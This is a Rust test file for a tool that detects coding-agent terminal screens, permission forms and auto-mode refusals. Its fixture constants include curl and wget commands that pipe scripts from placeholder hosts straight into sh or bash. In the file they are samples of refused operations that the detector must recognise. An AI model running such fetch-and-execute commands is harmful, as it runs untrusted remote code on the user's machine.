        fn gated_catalog_requires_a_background_focus_matcher_over_line_scoped_labels() {
            rejected("focus matcher without focus_style", |definition| {
                definition["profiles"][0]["rules"][0]["matchers"][2]
                    .as_object_mut()
                    .unwrap()
                    .remove("focus_style");
            });
            for style in [json!("bold"), json!(""), Value::Null, json!(true)] {
                rejected(&format!("focus_style {style}"), |definition| {
                    definition["profiles"][0]["rules"][0]["matchers"][2]["focus_style"] = style;
                });
            }
            rejected("region-scoped choice label", |definition| {
                definition["profiles"][0]["rules"][0]["matchers"][3]["scope"] = json!("region");
            });
            let mut textual = definitions();
            textual["profiles"][0]["rules"][0]["matchers"][1]["focus_style"] = json!("background");
            assert!(
                ProfileCatalog::from_definitions(&textual).is_ok(),
                "an ungated profile may declare a background focus matcher"
            );
        }

        #[test]
        fn every_backend_rejects_an_escape_byte_in_any_answer_stage() {
            for bytes in ["1b", "0d1b", "1b5b41"] {
                rejected(&format!("gated stage {bytes}"), |definition| {
                    *definition
                        .pointer_mut(&format!("{STAGES}/0/bytes_hex"))
                        .unwrap() = json!(bytes);
                });
                for backend in ["codex", "claude", "opencode"] {
                    let mut value = definitions();
                    value["fixtures"][0]["backend"] = json!(backend);
                    value["profiles"][0]["backend"] = json!(backend);
                    value["profiles"][0]["capabilities"]["answers"] = json!([{
                        "decision":"deny","request_rule_id":RULE,"answer_rule_id":"synthetic-escape",
                        "choice_id":"deny-once","focus_matcher_id":"deny","fixture_ids":[FIXTURE],
                        "stages":[{"bytes_hex":"6e","required_rule_id":RULE,"required_choice_id":"deny-once"}]
                    }]);
                    assert!(
                        ProfileCatalog::from_definitions(&value).is_ok(),
                        "{backend} baseline"
                    );
                    value["profiles"][0]["capabilities"]["answers"][0]["stages"][0]["bytes_hex"] =
                        json!(bytes);
                    assert!(
                        ProfileCatalog::from_definitions(&value).is_err(),
                        "{backend} ungated stage {bytes}"
                    );
                }
            }
        }
    }

    mod composer_submission {
        use crate::coding_agent::catalog::tests::*;
        #[test]
        fn composer_submit_byte_limits_are_inclusive_before_plan_construction() {
            for operation in [ComposerOperation::Prompt, ComposerOperation::Exec] {
                for length in [1, 32] {
                    let hex = "7a".repeat(length);
                    let good = match operation {
                        ComposerOperation::Prompt => definition(Some(&hex), None),
                        ComposerOperation::Exec => definition(None, Some(&hex)),
                    };
                    let catalog = ProfileCatalog::from_definitions(&good).unwrap();
                    assert_eq!(
                        plan(&catalog, operation).encode("literal").unwrap(),
                        expected(operation, "literal", &vec![b'z'; length])
                    );
                    for invalid in [0, 33] {
                        let mut bad = good.clone();
                        bad["profiles"][0]["capabilities"]["composer"]["submission"]
                            [operation_name(operation)]["submit_hex"] = json!("7a".repeat(invalid));
                        reject(&good, &bad, operation, "decoded submit length");
                    }
                }
            }
        }

        #[test]
        fn composer_prefix_shape_hex_and_operation_identity_are_validated() {
            let good = definition(Some("7e"), Some("6b6c"));
            for operation in [ComposerOperation::Prompt, ComposerOperation::Exec] {
                let values = match operation {
                    ComposerOperation::Prompt => vec![
                        json!("00"),
                        json!("2120"),
                        json!("A0"),
                        json!("0"),
                        json!("gg"),
                    ],
                    ComposerOperation::Exec => vec![
                        json!(""),
                        json!("21"),
                        json!("2121"),
                        json!("212000"),
                        json!("212"),
                        json!("212A"),
                        json!("212g"),
                    ],
                };
                for invalid in values.into_iter().chain([
                    Value::Null,
                    json!(17),
                    json!(true),
                    json!([]),
                    json!({}),
                ]) {
                    let mut bad = good.clone();
                    bad["profiles"][0]["capabilities"]["composer"]["submission"]
                        [operation_name(operation)]["prefix_hex"] = invalid;
                    reject(&good, &bad, operation, "operation prefix");
                }
            }
        }

        #[test]
        fn composer_submit_hex_requires_nonempty_even_lowercase_hex_and_string_type() {
            let good = definition(Some("7e"), Some("6b6c"));
            for operation in [ComposerOperation::Prompt, ComposerOperation::Exec] {
                for invalid in [
                    json!(""),
                    json!("0"),
                    json!("ABCDEF"),
                    json!("zz"),
                    json!("7e "),
                    json!("é"),
                    Value::Null,
                    json!(17),
                    json!(false),
                    json!([]),
                    json!({}),
                ] {
                    let mut bad = good.clone();
                    bad["profiles"][0]["capabilities"]["composer"]["submission"]
                        [operation_name(operation)]["submit_hex"] = invalid;
                    reject(&good, &bad, operation, "submit hex");
                }
            }
        }

        #[test]
        fn composer_optional_submission_and_operation_objects_have_exact_complete_fields() {
            let good = definition(Some("7e"), Some("6b6c"));
            for field in ["rule_ids", "fixture_ids"] {
                let mut bad = good.clone();
                bad["profiles"][0]["capabilities"]["composer"]
                    .as_object_mut()
                    .unwrap()
                    .remove(field)
                    .unwrap();
                reject(
                    &good,
                    &bad,
                    ComposerOperation::Prompt,
                    "missing composer field",
                );
            }
            let mut extra = good.clone();
            extra["profiles"][0]["capabilities"]["composer"]["unknown"] = json!(true);
            reject(
                &good,
                &extra,
                ComposerOperation::Prompt,
                "unknown composer field",
            );
            let submission = "/profiles/0/capabilities/composer/submission";
            for invalid in [
                Value::Null,
                json!(true),
                json!(17),
                json!("object required"),
                json!([]),
            ] {
                let mut bad = good.clone();
                *bad.pointer_mut(submission).unwrap() = invalid;
                reject(&good, &bad, ComposerOperation::Prompt, "submission object");
            }
            for field in ["prompt", "exec"] {
                let mut bad = good.clone();
                bad.pointer_mut(submission)
                    .unwrap()
                    .as_object_mut()
                    .unwrap()
                    .remove(field)
                    .unwrap();
                reject(&good, &bad, ComposerOperation::Prompt, "missing operation");
            }
            let mut extra = good.clone();
            extra.pointer_mut(submission).unwrap()["unknown"] = json!(true);
            reject(
                &good,
                &extra,
                ComposerOperation::Prompt,
                "unknown submission field",
            );
            for operation in [ComposerOperation::Prompt, ComposerOperation::Exec] {
                let pointer = format!("{submission}/{}", operation_name(operation));
                for field in ["prefix_hex", "submit_hex", "fixture_ids"] {
                    let mut bad = good.clone();
                    bad.pointer_mut(&pointer)
                        .unwrap()
                        .as_object_mut()
                        .unwrap()
                        .remove(field)
                        .unwrap();
                    reject(&good, &bad, operation, "missing plan field");
                }
                let mut extra = good.clone();
                extra.pointer_mut(&pointer).unwrap()["unknown"] = json!(true);
                reject(&good, &extra, operation, "unknown plan field");
                for invalid in [json!(true), json!(17), json!("plan required"), json!([])] {
                    let mut bad = good.clone();
                    *bad.pointer_mut(&pointer).unwrap() = invalid;
                    reject(&good, &bad, operation, "plan object");
                }
            }
        }

        #[test]
        fn composer_each_operation_requires_its_own_valid_fixture_reference_set() {
            let good = definition(Some("7e"), Some("6b6c"));
            for operation in [ComposerOperation::Prompt, ComposerOperation::Exec] {
                let own = match operation {
                    ComposerOperation::Prompt => PROMPT_FIXTURE,
                    ComposerOperation::Exec => EXEC_FIXTURE,
                };
                for invalid in [
                    json!([]),
                    json!([""]),
                    json!([" "]),
                    json!(["unknown-fixture"]),
                    json!([own, own]),
                    Value::Null,
                    json!(own),
                    json!(17),
                    json!({}),
                ] {
                    let mut bad = good.clone();
                    bad["profiles"][0]["capabilities"]["composer"]["submission"]
                        [operation_name(operation)]["fixture_ids"] = invalid;
                    reject(&good, &bad, operation, "operation fixture set");
                }
                for mismatch in ["backend", "native_version"] {
                    let mut bad = good.clone();
                    let mut foreign = bad["fixtures"][0].clone();
                    foreign["id"] = json!("foreign-operation-fixture");
                    foreign[mismatch] = if mismatch == "backend" {
                        json!(
                            CodingAgent::all()
                                .iter()
                                .find(|&&backend| backend != CodingAgent::Codex)
                                .unwrap()
                                .name()
                        )
                    } else {
                        json!("0.0.0")
                    };
                    bad["fixtures"].as_array_mut().unwrap().push(foreign);
                    bad["profiles"][0]["capabilities"]["composer"]["submission"]
                        [operation_name(operation)]["fixture_ids"] =
                        json!(["foreign-operation-fixture"]);
                    reject(&good, &bad, operation, "foreign operation provenance");
                }
            }
        }

        #[test]
        fn composer_operation_provenance_captured_inside_the_interval_serves_every_later_run() {
            let mut good = definition(Some("7e"), Some("6b6c"));
            for fixture in good["fixtures"].as_array_mut().unwrap() {
                if fixture["id"] != FIXTURE {
                    fixture["native_version"] = json!(VERSION_TWO);
                }
            }
            let catalog = ProfileCatalog::from_definitions(&good).unwrap();
            for (operation, fixture) in [
                (ComposerOperation::Prompt, PROMPT_FIXTURE),
                (ComposerOperation::Exec, EXEC_FIXTURE),
            ] {
                let selected = catalog
                    .composer_plan(CodingAgent::Codex, "7.0.0-beta.1", operation)
                    .expect("a later run reuses the profile's plan");
                assert_eq!(selected.native_version(), "7.0.0-beta.1");
                assert_eq!(selected.fixture_ids(), &[fixture.to_owned()]);
            }
        }

        #[test]
        fn composer_rule_references_keep_component_identity_and_declared_order() {
            let mut good = definition(Some("7e"), Some("6b6c"));
            good["profiles"][0]["rules"]
                .as_array_mut()
                .unwrap()
                .push(definitions()["profiles"][0]["rules"][0].clone());
            good["profiles"][0]["capabilities"]["detection"] =
                json!({"rule_ids":[RULE],"fixture_ids":[FIXTURE]});
            let catalog = ProfileCatalog::from_definitions(&good).unwrap();
            assert_eq!(
                catalog
                    .capabilities(CodingAgent::Codex, Some(VERSION))
                    .detection,
                Coverage::Tested
            );
            for operation in [ComposerOperation::Prompt, ComposerOperation::Exec] {
                let own = match operation {
                    ComposerOperation::Prompt => PROMPT_FIXTURE,
                    ComposerOperation::Exec => EXEC_FIXTURE,
                };
                metadata(&plan(&catalog, operation), &[own.to_owned()]);
                for invalid in [
                    json!([]),
                    json!(["unknown-rule"]),
                    json!([RULE]),
                    json!([EMPTY, EMPTY]),
                ] {
                    let mut bad = good.clone();
                    bad["profiles"][0]["capabilities"]["composer"]["rule_ids"] = invalid;
                    reject(&good, &bad, operation, "composer rule component");
                }
            }
        }
    }
    mod bundled_claude {
        use crate::coding_agent::catalog::tests::*;

        const CLAUDE_VERSION: &str = "2.1.302";
        const NATIVE_FIXTURE: &str = "claude-2.1.302-default-permission-1";
        const IDLE_FIXTURE: &str = "claude-2.1.302-idle-composer-1";
        const WRAPPED_FIXTURE: &str = "claude-2.1.302-wrapped-permission-1";

        fn bytes(id: &str) -> Vec<u8> {
            bundled_fixture(id).into_bytes()
        }

        #[test]
        fn bundled_guard_rejects_a_restored_masked_status_row_of_the_idle_composer() {
            assert!(guarded_fixture(IDLE_FIXTURE, |_| {}, |_| {}).is_ok());
            assert!(
                guarded_fixture(
                    IDLE_FIXTURE,
                    |_| {},
                    |s| s["lines"][33] = json!("  Opus 5.5 (1M context)")
                )
                .is_err(),
                "a restored masked status row is rejected"
            );
        }

        fn sequenced_replay(
            bytes: &[u8],
            change: impl FnOnce(&mut Vec<String>),
            output_seq: u64,
        ) -> ScreenObservation {
            let catalog = ProfileCatalog::bundled().unwrap();
            let screen =
                replay_native_fixture(std::str::from_utf8(bytes).unwrap(), change, true, None);
            let mut observation =
                Detector::new(&catalog, CodingAgent::Claude, Some(CLAUDE_VERSION))
                    .observe(&screen)
                    .unwrap();
            observation.output_seq = output_seq;
            observation.raw_evidence["screen_seq"] = json!(output_seq);
            observation
        }

        #[test]
        fn bundled_claude_resize_between_wrapped_and_unwrapped_renderings_replaces_the_episode() {
            let wrapped =
                |output_seq| sequenced_replay(&bytes(WRAPPED_FIXTURE), |_| {}, output_seq);
            let unwrapped = |output_seq| {
                sequenced_replay(
                    &bytes(NATIVE_FIXTURE),
                    |lines| {
                        lines[18] =
                            " /tmp/cafleet-194/claude-wrap-cells-001/permission-probe allow".into()
                    },
                    output_seq,
                )
            };
            let origin = Instant::now();
            let mut tracker = tracker();
            open(&mut tracker, &wrapped(1), origin);
            let mut episode = 1;
            for (start, rendering) in [(200, unwrapped(2)), (800, wrapped(3))] {
                let pending = tracker
                    .observe(&rendering, origin + Duration::from_millis(start), NOW)
                    .unwrap();
                assert!(
                    pending.transitions.is_empty(),
                    "the rewrap at {start} ms first awaits stability: {:?}",
                    pending.transitions
                );
                let replaced = tracker
                    .observe(&rendering, origin + Duration::from_millis(start + 100), NOW)
                    .unwrap();
                assert_eq!(replaced.transitions.len(), 2, "{:?}", replaced.transitions);
                assert_eq!(
                    replaced.transitions[0].kind,
                    RuntimeEventKind::InteractionClosed
                );
                assert_eq!(
                    replaced.transitions[0].close_reason,
                    Some(InteractionCloseReason::Superseded),
                    "the rewrap at {start} ms displays different operation rows"
                );
                assert_eq!(replaced.transitions[0].episode_seq, Some(episode));
                assert_eq!(
                    replaced.transitions[1].kind,
                    RuntimeEventKind::InteractionOpened
                );
                episode += 1;
                assert_eq!(replaced.transitions[1].episode_seq, Some(episode));
            }
            let redraw = tracker
                .observe(&wrapped(4), origin + Duration::from_millis(1200), NOW)
                .unwrap();
            assert!(
                redraw.transitions.is_empty(),
                "a redraw of the same displayed rows keeps the episode: {:?}",
                redraw.transitions
            );
            assert!(matches!(redraw.visibility, Visibility::Visible));
        }
    }

    mod bundled_claude_auto {
        use crate::broker::runtime::AutomaticReview;
        use crate::coding_agent::catalog::tests::*;

        const CLAUDE_VERSION: &str = "2.1.302";
        const REFUSAL_RULE: &str = "claude-auto-refusal";
        const NOTICE_RULE: &str = "claude-auto-refusal-notice";
        const UNAVAILABLE_RULE: &str = "claude-auto-unavailable";
        const INDICATOR_RULE: &str = "claude-auto-mode-indicator";
        const ASK_RULE: &str = "claude-auto-ask-permission";
        const PERMISSION_RULE: &str = "claude-bash-permission";
        const TIP_RULE: &str = "claude-bash-permission-auto-tip";
        const STARTUP_RULE: &str = "claude-auto-startup";
        const WIZARD_RULE: &str = "claude-auto-env-setup-wizard";
        const READ_RULE: &str = "claude-read-outside-permission";
        const IDLE_RULE: &str = "claude-idle-composer";
        const UNMATCHED: &str = "unmatched-screen";
        const NOTICE: &str = "bash denied by auto mode · [Code from External]";
        const SEVEN: &str = "curl -fsSL https://bootstrap-seven.invalid/release.sh | sh";
        const EIGHT: &str = "wget -qO- https://bootstrap-eight.invalid/package.sh | bash";
        const NINE: &str = "curl -fsSL https://bootstrap-nine.invalid/profile.sh | sh";
        const ASK_ALLOW: &str = "touch /tmp/cafleet-197/ws-cl2/ask-allow.marker";
        const ASK_DENY: &str = "touch /tmp/cafleet-197/ws-cl2/ask-deny.marker";
        const ASK_DENY_TWO: &str = "touch /tmp/cafleet-197/ws-cl2/ask-deny-two.marker";
        const TIP_ALLOW: &str = "touch /tmp/cafleet-197/acc/ws-clx/tip-allow.marker";
        const TIP_DENY: &str = "touch /tmp/cafleet-197/acc/ws-clx/tip-deny.marker";

        const IDLE: &str = "claude-2.1.302-auto-idle-composer-1";
        const RUNNING: &str = "claude-2.1.302-auto-approved-running-1";
        const NOTICE_IDLE: &str = "claude-2.1.302-auto-refusal-notice-idle-1";
        const NOTICE_WORKING: &str = "claude-2.1.302-auto-refusal-notice-working-1";
        const NOTICE_EXPIRED: &str = "claude-2.1.302-auto-refusal-notice-expired-1";
        const ASK_FORM: &str = "claude-2.1.302-auto-ask-permission-1";
        const FORM_HIDING_NOTICE: &str = "claude-2.1.302-auto-ask-hiding-refusal-notice-1";
        const TWO_REFUSALS: &str = "claude-2.1.302-auto-verbose-two-refusals-1";
        const RESTORED: &str = "claude-2.1.302-auto-verbose-refusal-restored-idle-1";
        const REWRAPPED: &str = "claude-2.1.302-auto-verbose-refusal-rewrapped-idle-1";
        const REWRAPPED_FORM: &str = "claude-2.1.302-auto-verbose-refusal-rewrapped-form-1";
        const HIDDEN_BY_FORM: &str = "claude-2.1.302-auto-verbose-refusal-hidden-by-form-1";
        const VIEWER: &str = "claude-2.1.302-auto-transcript-viewer-1";
        const VERBOSE_VIEWER: &str = "claude-2.1.302-auto-verbose-transcript-viewer-1";
        const QUOTE: &str = "claude-2.1.302-auto-quote-false-positive-1";
        const VERBOSE_QUOTE: &str = "claude-2.1.302-auto-verbose-quote-false-positive-1";
        const UNAVAILABLE_NOTICE: &str = "claude-2.1.302-auto-unavailable-notice-1";
        const MANUAL_FOOTER: &str = "claude-2.1.302-auto-unavailable-manual-footer-1";
        const TIP_FORM: &str = "claude-2.1.302-access-permission-1";
        const TIP_ALLOW_PRE_STAGE: &str = "claude-2.1.302-access-allow-pre-stage-1";
        const TIP_ALLOW_RUNNING: &str = "claude-2.1.302-access-allow-running-1";
        const TIP_DENY_PRE_STAGE: &str = "claude-2.1.302-access-deny-pre-stage-1";
        const STARTUP_OFFER: &str = "claude-2.1.302-auto-env-setup-offer-1";
        const STARTUP_WIZARD: &str = "claude-2.1.302-auto-env-setup-wizard-1";
        const STARTUP_CANCELLED: &str = "claude-2.1.302-auto-env-setup-cancelled-idle-1";
        const READ_FORM: &str = "claude-2.1.309-read-outside-permission-1";
        const READ_LONG: &str = "claude-2.1.309-read-outside-long-path-1";
        const READ_ALLOW_PRE_STAGE: &str = "claude-2.1.309-read-outside-allow-pre-stage-1";
        const READ_DENY_PRE_STAGE: &str = "claude-2.1.309-read-outside-deny-pre-stage-1";
        const READ_ALLOW_CONTINUATION: &str = "claude-2.1.309-read-outside-allow-continuation-1";
        const READ_DENY_CONTINUATION: &str = "claude-2.1.309-read-outside-deny-continuation-1";
        const EDIT_READ_FORM: &str = "claude-2.1.309-edit-outside-permission-1";
        const READ_CHOICES: [&str; 2] = [
            "Yes, but ask again next time",
            "No, and ask again next time",
        ];

        type Expected = (
            &'static str,
            ObservationKind,
            &'static str,
            &'static [(&'static str, Option<&'static str>)],
        );

        const COMPOSER: ObservationKind = ObservationKind::ComposerEmpty;
        const FORM: ObservationKind =
            ObservationKind::Interaction(InteractionClass::PermissionRequest);
        const QUESTION: ObservationKind = ObservationKind::Interaction(InteractionClass::Question);
        const UNKNOWN: ObservationKind = ObservationKind::Unknown;
        const INDICATOR: (&str, Option<&str>) = (INDICATOR_RULE, None);

        const CLASSIFICATION: [Expected; 46] = [
            (READ_ALLOW_CONTINUATION, COMPOSER, IDLE_RULE, &[INDICATOR]),
            (READ_DENY_CONTINUATION, COMPOSER, IDLE_RULE, &[INDICATOR]),
            (READ_FORM, FORM, READ_RULE, &[]),
            (READ_LONG, FORM, READ_RULE, &[]),
            (READ_ALLOW_PRE_STAGE, FORM, READ_RULE, &[]),
            (READ_DENY_PRE_STAGE, FORM, READ_RULE, &[]),
            (EDIT_READ_FORM, FORM, READ_RULE, &[]),
            (
                "claude-2.1.302-access-allow-continuation-1",
                COMPOSER,
                IDLE_RULE,
                &[],
            ),
            (
                "claude-2.1.308-auto-tip-padded-question-1",
                FORM,
                TIP_RULE,
                &[],
            ),
            (TIP_ALLOW_PRE_STAGE, FORM, TIP_RULE, &[]),
            (TIP_ALLOW_RUNNING, COMPOSER, IDLE_RULE, &[]),
            (
                "claude-2.1.302-access-deny-continuation-1",
                COMPOSER,
                IDLE_RULE,
                &[],
            ),
            (TIP_DENY_PRE_STAGE, FORM, TIP_RULE, &[]),
            (TIP_FORM, FORM, TIP_RULE, &[]),
            (
                "claude-2.1.302-auto-approved-done-1",
                COMPOSER,
                IDLE_RULE,
                &[INDICATOR],
            ),
            (RUNNING, COMPOSER, IDLE_RULE, &[INDICATOR]),
            (
                "claude-2.1.302-auto-ask-allow-continuation-1",
                COMPOSER,
                IDLE_RULE,
                &[INDICATOR],
            ),
            (
                "claude-2.1.302-auto-ask-deny-continuation-1",
                COMPOSER,
                IDLE_RULE,
                &[INDICATOR],
            ),
            (FORM_HIDING_NOTICE, FORM, ASK_RULE, &[]),
            (
                "claude-2.1.302-auto-ask-hiding-refusal-notice-resized-1",
                FORM,
                ASK_RULE,
                &[],
            ),
            (ASK_FORM, FORM, ASK_RULE, &[]),
            (STARTUP_CANCELLED, COMPOSER, IDLE_RULE, &[INDICATOR]),
            (STARTUP_OFFER, QUESTION, STARTUP_RULE, &[INDICATOR]),
            (STARTUP_WIZARD, QUESTION, WIZARD_RULE, &[]),
            (
                "claude-2.1.302-auto-fresh-first-launch-notice-1",
                UNKNOWN,
                UNMATCHED,
                &[],
            ),
            (
                "claude-2.1.302-auto-fresh-onboarding-theme-1",
                UNKNOWN,
                UNMATCHED,
                &[],
            ),
            (IDLE, COMPOSER, IDLE_RULE, &[INDICATOR]),
            (
                "claude-2.1.302-auto-model-switch-question-1",
                UNKNOWN,
                UNMATCHED,
                &[],
            ),
            (QUOTE, COMPOSER, IDLE_RULE, &[INDICATOR]),
            (NOTICE_EXPIRED, COMPOSER, IDLE_RULE, &[INDICATOR]),
            (
                NOTICE_IDLE,
                COMPOSER,
                IDLE_RULE,
                &[(NOTICE_RULE, Some(NOTICE)), INDICATOR],
            ),
            (
                NOTICE_WORKING,
                COMPOSER,
                IDLE_RULE,
                &[(NOTICE_RULE, Some(NOTICE)), INDICATOR],
            ),
            (VIEWER, UNKNOWN, UNMATCHED, &[]),
            (
                "claude-2.1.302-auto-two-refusals-notice-1",
                COMPOSER,
                IDLE_RULE,
                &[(NOTICE_RULE, Some(NOTICE)), INDICATOR],
            ),
            (MANUAL_FOOTER, COMPOSER, IDLE_RULE, &[]),
            (
                UNAVAILABLE_NOTICE,
                COMPOSER,
                IDLE_RULE,
                &[(UNAVAILABLE_RULE, None)],
            ),
            (
                VERBOSE_QUOTE,
                COMPOSER,
                IDLE_RULE,
                &[
                    (REFUSAL_RULE, Some(SEVEN)),
                    (REFUSAL_RULE, Some(EIGHT)),
                    INDICATOR,
                ],
            ),
            (
                "claude-2.1.302-auto-verbose-refusal-above-form-1",
                FORM,
                ASK_RULE,
                &[],
            ),
            (HIDDEN_BY_FORM, FORM, ASK_RULE, &[]),
            (
                RESTORED,
                COMPOSER,
                IDLE_RULE,
                &[(REFUSAL_RULE, Some(NINE)), INDICATOR],
            ),
            (REWRAPPED_FORM, FORM, ASK_RULE, &[]),
            (
                REWRAPPED,
                COMPOSER,
                IDLE_RULE,
                &[(REFUSAL_RULE, Some(NINE)), INDICATOR],
            ),
            (VERBOSE_VIEWER, UNKNOWN, UNMATCHED, &[]),
            (
                TWO_REFUSALS,
                COMPOSER,
                IDLE_RULE,
                &[
                    (REFUSAL_RULE, Some(SEVEN)),
                    (REFUSAL_RULE, Some(EIGHT)),
                    INDICATOR,
                ],
            ),
            (
                "claude-2.1.302-default-manual-idle-1",
                COMPOSER,
                IDLE_RULE,
                &[],
            ),
            ("claude-2.1.302-trust-dialog-1", UNKNOWN, UNMATCHED, &[]),
        ];

        fn bytes(id: &str) -> Vec<u8> {
            bundled_fixture(id).into_bytes()
        }

        fn document(id: &str) -> Value {
            serde_json::from_slice(&bytes(id)).unwrap()
        }

        fn replay(id: &str, alternate: bool) -> ScreenSnapshot {
            replay_native_fixture(
                std::str::from_utf8(&bytes(id)).unwrap(),
                |_| {},
                alternate,
                None,
            )
        }

        fn screen(id: &str) -> ScreenSnapshot {
            replay(id, document(id)["alternate_screen"].as_bool().unwrap())
        }

        fn detector(catalog: &ProfileCatalog) -> Detector {
            Detector::new(catalog, CodingAgent::Claude, Some(CLAUDE_VERSION))
        }

        fn observe(id: &str) -> ScreenObservation {
            detector(&ProfileCatalog::bundled().unwrap())
                .observe(&screen(id))
                .unwrap()
        }

        fn without_annotation_rules() -> ProfileCatalog {
            let mut value: Value = serde_json::from_str(include_str!("bundled.json")).unwrap();
            let profile = value["profiles"]
                .as_array_mut()
                .unwrap()
                .iter_mut()
                .find(|profile| profile["backend"] == "claude")
                .expect("bundled automatic-mode Claude profile");
            profile["rules"].as_array_mut().unwrap().retain(|rule| {
                !rule["observation"]
                    .as_str()
                    .unwrap()
                    .starts_with("automatic_")
            });
            profile["capabilities"]["annotations"] = Value::Null;
            ProfileCatalog::from_definitions(&value).unwrap()
        }

        fn shown(operation: &Value) -> Option<String> {
            operation.as_str().map(|text| {
                text.split('\n')
                    .map(str::trim)
                    .collect::<Vec<_>>()
                    .join(" ")
            })
        }

        fn annotation_set(observed: &ScreenObservation) -> Vec<(String, Option<String>)> {
            let mut blocks = observed.annotations.iter().collect::<Vec<_>>();
            blocks.sort_by_key(|block| block.matched_region.top);
            blocks
                .into_iter()
                .map(|block| {
                    (
                        block.rule_id.clone(),
                        shown(&block.raw_evidence["operation"]),
                    )
                })
                .collect()
        }

        fn redacted() -> EvidencePolicy {
            EvidencePolicy::redacted(
                &json!({"schema_version":1,"patterns":["fixture-secret-197-unique"],"sensitive_rules":[]}),
                &[REFUSAL_RULE, NOTICE_RULE, UNAVAILABLE_RULE, INDICATOR_RULE, ASK_RULE],
            )
            .unwrap()
        }

        fn replay_run(policy: EvidencePolicy) -> Run {
            Run::new(policy, observe)
        }

        fn assert_annotation_event(event: &TransitionDraft, kind: RuntimeEventKind, rule: &str) {
            assert_eq!(event.kind, kind);
            assert_eq!(event.run_id, 1);
            assert_eq!(event.episode_seq, None);
            assert_eq!(event.classification, None);
            assert_eq!(event.close_reason, None);
            assert_eq!(event.cause_json, None);
            assert_eq!(event.observed_at, NOW);
            assert_eq!(event.evidence_json["rule_id"], rule);
            assert_eq!(event.evidence_json["backend"], "claude");
            assert_eq!(event.evidence_json["native_version"], CLAUDE_VERSION);
        }

        #[test]
        fn bundled_claude_auto_fixtures_produce_their_primary_and_annotation_sets() {
            for (id, kind, rule, annotations) in CLASSIFICATION {
                let observed = observe(id);
                assert_eq!(observed.kind, kind, "{id}");
                assert_eq!(observed.rule_id, rule, "{id}");
                assert_eq!(
                    observed.raw_evidence["native_version"], CLAUDE_VERSION,
                    "{id}"
                );
                assert_ne!(observed.kind, ObservationKind::PermissionDenied, "{id}");
                assert_eq!(
                    annotation_set(&observed),
                    annotations
                        .iter()
                        .map(|(rule, operation)| ((*rule).to_owned(), operation.map(String::from)))
                        .collect::<Vec<_>>(),
                    "{id}"
                );
                for block in &observed.annotations {
                    let kind = match block.rule_id.as_str() {
                        REFUSAL_RULE | NOTICE_RULE => ObservationKind::AutomaticRefusal,
                        UNAVAILABLE_RULE => ObservationKind::AutomaticReviewUnavailable,
                        _ => ObservationKind::AutomaticReviewAvailable,
                    };
                    assert_eq!(block.kind, kind, "{id} {}", block.rule_id);
                    assert_eq!(block.raw_evidence["rule_id"], block.rule_id.as_str());
                    assert_eq!(block.raw_evidence["native_version"], CLAUDE_VERSION);
                    let mode = if block.rule_id == INDICATOR_RULE {
                        json!("auto mode")
                    } else {
                        Value::Null
                    };
                    assert_eq!(
                        block.raw_evidence["observed_mode"], mode,
                        "{id} {}",
                        block.rule_id
                    );
                }
            }
        }

        #[test]
        fn bundled_claude_auto_annotations_leave_every_primary_observation_unchanged() {
            let plain = without_annotation_rules();
            for (id, _, _, _) in CLASSIFICATION {
                let annotated = observe(id);
                let primary = detector(&plain).observe(&screen(id)).unwrap();
                assert!(primary.annotations.is_empty(), "{id}");
                assert_eq!(annotated.kind, primary.kind, "{id}");
                assert_eq!(annotated.rule_id, primary.rule_id, "{id}");
                assert_eq!(annotated.match_evidence, primary.match_evidence, "{id}");
                assert_eq!(annotated.matched_region, primary.matched_region, "{id}");
                assert_eq!(annotated.raw_evidence, primary.raw_evidence, "{id}");
                assert_eq!(
                    annotated.verified_noninteraction, primary.verified_noninteraction,
                    "{id}"
                );
                assert!(annotated.fingerprint == primary.fingerprint, "{id}");
            }
        }

        #[test]
        fn bundled_claude_auto_ask_form_answers_allow_with_1_and_deny_with_2_ungated() {
            let catalog = ProfileCatalog::bundled().unwrap();
            let form = observe(ASK_FORM);
            assert_eq!(form.match_evidence, MatchEvidence::Complete);
            assert!(!form.verified_noninteraction);
            assert_eq!(form.raw_evidence["operation"], ASK_ALLOW);
            assert_eq!(form.raw_evidence["choices"], json!(["Yes", "No"]));
            let default_form = screen("claude-2.1.302-default-permission-1");
            for (decision, choice, byte) in [
                (PermissionDecision::Allow, "allow-once", b"1"),
                (PermissionDecision::Deny, "deny-once", b"2"),
            ] {
                let plan = catalog
                    .answer_plan(
                        CodingAgent::Claude,
                        CLAUDE_VERSION,
                        ASK_RULE,
                        &AnswerKey::Decision(decision),
                    )
                    .expect("ask-rule answer plan");
                assert_eq!(plan.choice_id(), choice);
                assert_eq!(plan.stages().len(), 1, "{decision:?}");
                let stage = &plan.stages()[0];
                assert_eq!(stage.bytes(), byte);
                assert_eq!(stage.required_rule_id(), ASK_RULE);
                assert_eq!(stage.required_choice_id(), choice);
                assert!(stage.gate().is_none(), "{decision:?} is ungated");
                assert_eq!(plan.capability().native_version(), CLAUDE_VERSION);
                let matched = detector(&catalog)
                    .match_answer(&screen(ASK_FORM), &plan)
                    .unwrap()
                    .expect("the ask form matches its plan");
                assert_eq!(matched.choices(), &["Yes".to_owned(), "No".to_owned()]);
                assert!(Some(matched.semantic()) == form.fingerprint.as_ref());
                assert!(
                    detector(&catalog)
                        .match_answer(&default_form, &plan)
                        .unwrap()
                        .is_none(),
                    "{decision:?} ask plan on the predecessor form"
                );
                let predecessor = catalog
                    .answer_plan(
                        CodingAgent::Claude,
                        CLAUDE_VERSION,
                        PERMISSION_RULE,
                        &AnswerKey::Decision(decision),
                    )
                    .unwrap();
                assert!(
                    detector(&catalog)
                        .match_answer(&screen(ASK_FORM), &predecessor)
                        .unwrap()
                        .is_none(),
                    "{decision:?} predecessor plan on the ask form"
                );
            }
            for (id, operation) in [
                (FORM_HIDING_NOTICE, ASK_DENY),
                (
                    "claude-2.1.302-auto-ask-hiding-refusal-notice-resized-1",
                    ASK_DENY,
                ),
                (HIDDEN_BY_FORM, ASK_DENY_TWO),
                (REWRAPPED_FORM, ASK_DENY_TWO),
            ] {
                assert_eq!(
                    shown(&observe(id).raw_evidence["operation"]).as_deref(),
                    Some(operation),
                    "{id}"
                );
            }
            assert_eq!(
                observe("claude-2.1.302-default-permission-1").rule_id,
                PERMISSION_RULE
            );
        }

        #[test]
        fn bundled_claude_auto_tip_form_answers_allow_with_1_and_deny_with_4_ungated() {
            let catalog = ProfileCatalog::bundled().unwrap();
            for (id, operation) in [
                (TIP_FORM, TIP_ALLOW),
                (TIP_ALLOW_PRE_STAGE, TIP_ALLOW),
                (TIP_DENY_PRE_STAGE, TIP_DENY),
            ] {
                let form = observe(id);
                assert_eq!(form.match_evidence, MatchEvidence::Complete, "{id}");
